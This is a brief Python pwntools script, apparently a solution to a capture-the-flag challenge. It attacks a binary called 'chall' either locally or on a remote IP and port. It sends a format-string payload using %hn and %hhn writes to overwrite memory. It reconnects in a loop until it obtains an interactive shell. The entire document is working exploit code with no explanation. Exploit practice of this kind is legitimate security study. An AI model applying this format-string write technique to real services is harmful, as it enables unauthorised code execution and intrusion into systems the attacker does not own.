#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 0
# context(log_level="debug", arch="i386", os="linux")
while True:
    try:
        if debug == 1:
            p = process('./chall')
        else:
            p = remote('119.3.172.70', 10005)

        # gdb.attach(p, "b *0x080485F6\nc\nsi")
        pd = '%188d%10$hhn|'
        pd += '%34213dbinLep%18$hn'
        p.sendline(pd)
        p.recvuntil('binLep')
        p.recv()
        p.recv(timeout=1)
    except EOFError:
        p.close()
        continue
    else:
        p.interactive()
        p.close()
        break
